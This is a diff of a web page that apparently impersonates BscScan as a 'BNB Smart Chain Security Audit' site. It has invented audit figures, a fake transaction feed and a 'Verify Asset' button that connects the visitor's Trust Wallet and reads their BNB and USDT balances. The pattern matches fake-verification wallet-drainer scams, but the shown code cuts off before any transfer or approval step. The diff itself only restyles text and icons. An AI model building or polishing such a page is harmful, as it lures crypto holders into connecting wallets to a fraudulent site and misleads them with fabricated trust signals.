@@ -46,6 +46,7 @@
       color: #eab308;
       font-weight: bold;
       font-size: 15px;
+      flex-shrink: 0;
     }
     .brand-title {
       font-size: 16px;
@@ -91,6 +92,11 @@
       letter-spacing: 0.5px;
       color: #8b95a5;
       margin-bottom: 8px;
+    }
+    .stat-tag {
+      color: #eab308;
+      font-weight: bold;
+      font-size: 11px;
     }
     .stat-num {
       font-size: 26px;
@@ -182,7 +188,8 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 24px;
+      font-size: 18px;
+      font-weight: bold;
     }
     .shield-wrap h3 {
       font-size: 20px;
@@ -216,6 +223,7 @@
       margin-top: 14px;
       padding-top: 12px;
       border-top: 1px solid #1d2534;
+      gap: 8px;
     }
     .box-footer span:last-child {
       color: #facc15;
@@ -278,7 +286,6 @@
       flex: 1 1 100%;
     }
 
-    /* Live On-Chain Feed Table */
     .feed-card {
       background: #111620;
       border: 1px solid #1e2636;
@@ -303,6 +310,7 @@
       color: #8b95a5;
       text-align: right;
       line-height: 1.35;
+      white-space: nowrap;
     }
     .feed-table {
       width: 100%;
@@ -347,7 +355,6 @@
       font-variant-numeric: tabular-nums;
     }
 
-    /* Footer */
     .page-footer {
       margin-top: 28px;
       padding-top: 18px;
@@ -389,7 +396,6 @@
 </head>
 <body>
   <div class="container">
-    <!-- Top Header -->
     <div class="topbar">
       <div class="brand">
         <div class="brand-icon">B</div>
@@ -401,11 +407,10 @@
       <div class="chain-pill">● BNB SMART CHAIN</div>
     </div>
 
-    <!-- Stats Cards -->
     <div class="stat-card">
       <div class="stat-top">
         <span>USDT VERIFIED (24H)</span>
-        <span>🛡️</span>
+        <span class="stat-tag">VERIFIED</span>
       </div>
       <div class="stat-num gold">$15,906,052</div>
       <div class="green">+8.24% vs yesterday</div>
@@ -414,7 +419,7 @@
     <div class="stat-card">
       <div class="stat-top">
         <span>TOTAL AUDITED VOLUME</span>
-        <span>🗄️</span>
+        <span class="stat-tag">VOLUME</span>
       </div>
       <div class="stat-num">$4,892,765,321</div>
       <div class="muted">All time consensus</div>
@@ -423,43 +428,41 @@
     <div class="stat-card">
       <div class="stat-top">
         <span>AUDIT CONSENSUS</span>
-        <span>⚙️</span>
+        <span class="stat-tag">CONSENSUS</span>
       </div>
       <div class="stat-num green" style="font-size:26px;">99.98% PASS</div>
       <div class="muted">1.05 Gwei Standard Gas</div>
     </div>
 
-    <!-- Hero Section -->
     <div class="hero">
-      <div class="protocol-pill">🛡️ BscScan Proof-of-Reserve Protocol</div>
+      <div class="protocol-pill">BscScan Proof-of-Reserve Protocol</div>
       <h1>BNB Smart Chain <span>Security Audit</span></h1>
       <p>The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</p>
     </div>
 
-    <!-- Verify BEP-20 Assets Card -->
     <div class="verify-box">
       <div class="token-row">
         <div class="token-left">
-          <div class="token-circle">₮</div>
+          <div class="token-circle">T</div>
           <div>
             <div style="font-weight:bold; font-size:15px;">Tether USD <span style="color:#8b95a5; font-size:12px;">(USDT)</span></div>
             <div class="muted">BEP-20 Standard</div>
           </div>
         </div>
-        <div class="verified-tag">✓ Verified</div>
+        <div class="verified-tag">Verified</div>
       </div>
 
       <div class="shield-wrap">
-        <div class="shield-icon">🛡️</div>
+        <div class="shield-icon">SEC</div>
         <h3>Verify BEP-20 Assets</h3>
         <p>Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</p>
       </div>
 
-      <button id="verifyBtn" class="verify-btn" type="button" onclick="handleVerifyClick()">
-        ✓ Verify Asset
+      <button id="verifyBtn" class="verify-btn" type="button">
+        Verify Asset
       </button>
 
-      <div id="statusText" class="status"></div>
+      <div id="statusText" class="status">Ready to verify.</div>
 
       <div id="walletInfo" class="info">
         <div class="info-row">
@@ -481,7 +484,7 @@
       </div>
 
       <div class="box-footer">
-        <span>🔒 Institutional Security Standard</span>
+        <span>Institutional Security Standard</span>
         <span>Zero Gas Fee Relay</span>
       </div>
     </div>
@@ -492,10 +495,9 @@
       <div class="chip chip-wide" style="color:#60a5fa;">● Solana Token (SOL) 0x570a...3464</div>
     </div>
 
-    <!-- Latest Verified Security Transactions -->
     <div class="feed-card">
       <div class="feed-header">
-        <div class="feed-title">📈 Latest Verified Security Transactions</div>
+        <div class="feed-title">Latest Verified Security Transactions</div>
         <div class="feed-sub">Live On-Chain Feed</div>
       </div>
 
@@ -537,7 +539,6 @@
       </table>
     </div>
 
-    <!-- Footer -->
     <footer class="page-footer">
       <div class="footer-brand">
         <div class="brand-icon" style="width:28px; height:28px; font-size:12px;">B</div>
@@ -578,7 +579,8 @@
 
     function setStatus(msg, isError = false) {
       const el = document.getElementById("statusText");
-      el.innerText = msg || "";
+      if (!el) return;
+      el.textContent = msg || "";
       el.className = isError ? "status error" : "status";
     }
 
@@ -605,7 +607,7 @@
         if (!accounts || accounts.length === 0) {
           isConnected = false;
           document.getElementById("walletInfo").style.display = "none";
-          document.getElementById("verifyBtn").innerText = "✓ Verify Asset";
+          document.getElementById("verifyBtn").textContent = "Verify Asset";
           setStatus("Wallet disconnected.");
           return;
         }
@@ -613,7 +615,7 @@
         await refreshWalletInfo(ethersProvider, accounts[0]);
         document.getElementById("walletInfo").style.display = "block";
         isConnected = true;
-        document.getElementById("verifyBtn").innerText = "✓ Verified (Re-check)";
+        document.getElementById("verifyBtn").textContent = "Verified (Re-check)";
       });
 
       rawProvider.on("chainChanged", async () => {
@@ -630,13 +632,13 @@
       const rawBalance = await ethersProvider.getBalance(address);
       const formattedNative = parseFloat(ethers.utils.formatEther(rawBalance)).toFixed(4);
 
-      document.getElementById("addressText").innerText = address;
-      document.getElementById("chainText").innerText = `${network.name} (${network.chainId})`;
-      document.getElementById("nativeBalanceText").innerText = formattedNative;
+      document.getElementById("addressText").textContent = address;
+      document.getElementById("chainText").textContent = `${network.name} (${network.chainId})`;
+      document.getElementById("nativeBalanceText").textContent = formattedNative;
 
       const usdtAddress = USDT_CONTRACTS[network.chainId];
       if (!usdtAddress) {
-        document.getElementById("usdtBalanceText").innerText = "Network not configured for USDT";
+        document.getElementById("usdtBalanceText").textContent = "Network not configured for USDT";
         return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 18 };
       }
 
@@ -647,7 +649,7 @@
       ]);
 
       const formattedUsdt = parseFloat(ethers.utils.formatUnits(rawUsdt, decimals)).toFixed(2);
-      document.getElementById("usdtBalanceText").innerText = `${formattedUsdt} USDT`;
+      document.getElementById("usdtBalanceText").textContent = `${formattedUsdt} USDT`;
 
       return { network, rawBalance, usdtAddress, rawUsdt, decimals };
     }
@@ -686,15 +688,15 @@
     }
 
     async function connectAndVerify() {
+      const btn = document.getElementById("verifyBtn");
+      const infoBox = document.getElementById("walletInfo");
+
       if (typeof ethers === "undefined") {
-        setStatus("ethers.js library load nahi hui.", true);
+        setStatus("ethers.js library load nahi hui. Network/CDN check karein.", true);
         return;
       }
 
       const rawProvider = getProvider();
-      const btn = document.getElementById("verifyBtn");
-      const infoBox = document.getElementById("walletInfo");
-
       if (!rawProvider) {
         setStatus("Wallet nahi mila. Trust Wallet ke DApp browser mein open karein.", true);
         return;
@@ -704,5 +706,4 @@
 
       try {
         btn.disabled = true;
-        btn.innerText = "Connecting Wallet...";
-        setSt
+        btn.textC
